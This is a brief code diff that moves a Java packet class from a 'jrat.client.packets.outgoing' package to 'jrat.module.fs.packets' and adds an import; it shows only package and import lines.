@@ -1,5 +1,6 @@
-package jrat.client.packets.outgoing;
+package jrat.module.fs.packets;
 
+import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.common.io.StringWriter;
 import java.io.DataOutputStream;
 
